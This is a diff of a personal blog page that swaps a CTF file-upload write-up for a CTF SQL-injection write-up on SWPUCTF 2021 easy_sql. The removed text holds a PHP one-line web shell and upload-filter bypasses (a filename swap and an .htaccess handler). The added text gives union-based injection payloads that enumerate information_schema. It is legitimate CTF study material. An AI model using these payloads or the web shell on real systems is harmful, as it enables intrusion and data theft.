@@ -19,15 +19,15 @@
   <meta name="author" content="SakuraQ">
   <meta name="keywords" content="网络安全  Web  渗透">
   
-    <meta name="description" content="CTF-UpLoad文件上传漏洞总结1.0版本​	创建新的php文件，文件内容写入一句话木马：这里我的文件名用test.php 1&lt;?php eval($_POST[&#x27;ctf&#x27;]); ?&gt;  ​	修改文件后缀名为.jpg，绕过前端文件类型检测，上传。再用BurpSuite拦截发往服务器的请求，将请求内容中filename&#x3D;”test.jpg”改为filen">
+    <meta name="description" content="CTF-Sql注入[SWPUCTF 2021 新生赛] easy_sql	WriteUp 从title可知参数名为wllm，先确定该数据表一共有几列，直到数据库返回null为止 12345-- url形式?wllm&#x3D;1&#x27; order by 3 --+ 	?wllm&#x3D;1&#x27; order by 4 --+	?wllm&#x3D;1&#x27; order by 5 --+......  （假设">
 <meta property="og:type" content="article">
-<meta property="og:title" content="UpLoad漏洞 WP">
-<meta property="og:url" content="http://yaesakuraq.github.io/2025/02/23/CTF-UpLoad%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:title" content="CTF-Sql注入">
+<meta property="og:url" content="http://yaesakuraq.github.io/2025/02/24/Sql%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="SakuraQ&#39;s Blog">
-<meta property="og:description" content="CTF-UpLoad文件上传漏洞总结1.0版本​	创建新的php文件，文件内容写入一句话木马：这里我的文件名用test.php 1&lt;?php eval($_POST[&#x27;ctf&#x27;]); ?&gt;  ​	修改文件后缀名为.jpg，绕过前端文件类型检测，上传。再用BurpSuite拦截发往服务器的请求，将请求内容中filename&#x3D;”test.jpg”改为filen">
+<meta property="og:description" content="CTF-Sql注入[SWPUCTF 2021 新生赛] easy_sql	WriteUp 从title可知参数名为wllm，先确定该数据表一共有几列，直到数据库返回null为止 12345-- url形式?wllm&#x3D;1&#x27; order by 3 --+ 	?wllm&#x3D;1&#x27; order by 4 --+	?wllm&#x3D;1&#x27; order by 5 --+......  （假设">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-02-23T15:16:40.000Z">
-<meta property="article:modified_time" content="2025-02-23T16:02:59.536Z">
+<meta property="article:published_time" content="2025-02-24T07:36:29.000Z">
+<meta property="article:modified_time" content="2025-02-24T15:23:32.459Z">
 <meta property="article:author" content="SakuraQ">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="Web">
@@ -37,7 +37,7 @@
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>UpLoad漏洞 WP - SakuraQ&#39;s Blog</title>
+  <title>CTF-Sql注入 - SakuraQ&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -203,7 +203,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="UpLoad漏洞 WP"></span>
+            <span id="subtitle" data-typed-text="CTF-Sql注入"></span>
           
         </div>
 
@@ -219,8 +219,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-02-23 23:16" pubdate>
-          2025-02-23 23:16:40
+        <time datetime="2025-02-24 15:36" pubdate>
+          2025-02-24 15:36:29
         </time>
       </span>
     
@@ -231,7 +231,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          279 字
+          280 字
         
       </span>
     
@@ -288,24 +288,33 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">UpLoad漏洞 WP</h1>
+            <h1 id="seo-header">CTF-Sql注入</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="CTF-UpLoad"><a href="#CTF-UpLoad" class="headerlink" title="CTF-UpLoad"></a>CTF-UpLoad</h1><h2 id="文件上传漏洞总结"><a href="#文件上传漏洞总结" class="headerlink" title="文件上传漏洞总结"></a>文件上传漏洞总结</h2><h3 id="1-0版本"><a href="#1-0版本" class="headerlink" title="1.0版本"></a>1.0版本</h3><p>​	创建新的php文件，文件内容写入一句话木马：这里我的文件名用test.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+                <h1 id="CTF-Sql注入"><a href="#CTF-Sql注入" class="headerlink" title="CTF-Sql注入"></a>CTF-Sql注入</h1><h2 id="SWPUCTF-2021-新生赛-easy-sqlWriteUp"><a href="#SWPUCTF-2021-新生赛-easy-sqlWriteUp" class="headerlink" title="[SWPUCTF 2021 新生赛] easy_sql	WriteUp"></a>[SWPUCTF 2021 新生赛] easy_sql	WriteUp</h2><ul>
+<li><p>从title可知参数名为wllm，先确定该数据表一共有几列，直到数据库返回null为止</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- url形式</span><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3 --+ 	</span><br><span class="hljs-string">?wllm=1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> <span class="hljs-comment">--+	</span><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 5 --+</span><br><span class="hljs-string">......</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>（假设完成上一步骤后，数据库只有三列）使用联合查询语句，union select后的列数必须与前面列数相同，否则会报错</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3 --+</span><br></code></pre></td></tr></table></figure>
 
-<p>​	修改文件后缀名为.jpg，绕过前端文件类型检测，上传。再用BurpSuite拦截发往服务器的请求，将请求内容中filename&#x3D;”test.jpg”改为filename&#x3D;”test.php”，转发后即可上传。</p>
-<p>​	用中国蚁剑链接，填入url&#x2F;upload&#x2F;test.php，密码为ctf，即可入侵后台拿到flag。</p>
-<h3 id="2-0版本"><a href="#2-0版本" class="headerlink" title="2.0版本"></a>2.0版本</h3><p>​	2.0版本新增了后端php文件类型检测，因此需将文件后缀名改为.phptml后重复1.0版本即可。</p>
-<h3 id="3-0版本"><a href="#3-0版本" class="headerlink" title="3.0版本"></a>3.0版本</h3><pre><code class="hljs"> 3.0版本新增后端php、phptml等等可用于php语言解析的文件后缀名检测，因此，需使用用于Apache Web服务器配置相关指令的.htaccess文件进行绕过。.htaccess文件中写入:
-</code></pre>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">&lt;FilesMatch &quot;test.jpg&quot;&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure>
-
-<p>可以在服务器端自动将test.jpg文件按照php文件来解析，达到绕过目的，最终拿到Flag。</p>
-<p>​	</p>
-<p>​	</p>
+<p>其中’–’是Sql语句通用注释符号，’+’的目的是为了代替空格保证注释生效。</p>
+</li>
+<li><p>根据回显结果查询数据库名称，得到数据库名为test_db</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-string">&#x27; union select 1,2,database() --+</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>再次查询该数据库中的数据表名称，得到数据表名有test_tb,users</p>
+<p>其中group_concat()的作用是将查询到的表名排成一行而不是分行排列</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>test_db<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查询分别查询两张数据表中的字段，发现test_tb中有flag字段</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>test_tb<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?wllm=2&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查询test_tb中的flag字段最终得到flag</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-string">&#x27; union select 1,2,flag from test_tb --+</span><br></code></pre></td></tr></table></figure></li>
+</ul>
 
                 
               </div>
@@ -334,7 +343,7 @@
   
     <span>></span>
     
-  <a href="/categories/CTF/Web/UpLoad/" class="category-chain-item">UpLoad</a>
+  <a href="/categories/CTF/Web/Sql%E6%B3%A8%E5%85%A5/" class="category-chain-item">Sql注入</a>
   
   
 
@@ -367,8 +376,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>UpLoad漏洞 WP</div>
-      <div>http://yaesakuraq.github.io/2025/02/23/CTF-UpLoad漏洞/</div>
+      <div>CTF-Sql注入</div>
+      <div>http://yaesakuraq.github.io/2025/02/24/Sql注入/</div>
     </div>
     <div class="license-meta">
       
@@ -380,7 +389,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年2月23日</div>
+          <div>2025年2月24日</div>
         </div>
       
       
@@ -412,18 +421,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/02/24/%E6%97%A5%E6%9C%AC%E8%AA%9E%E3%82%92%E5%8B%89%E5%BC%B7%E3%81%99%E3%82%8B/" title="日本語の勉強">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">日本語の勉強</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/02/11/HelloWorld/" title="HelloWorld">
-                        <span class="hidden-mobile">HelloWorld</span>
+                      <a href="/2025/02/24/%E6%97%A5%E6%9C%AC%E8%AA%9E%E3%82%92%E5%8B%89%E5%BC%B7%E3%81%99%E3%82%8B/" title="日本語の勉強">
+                        <span class="hidden-mobile">日本語の勉強</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
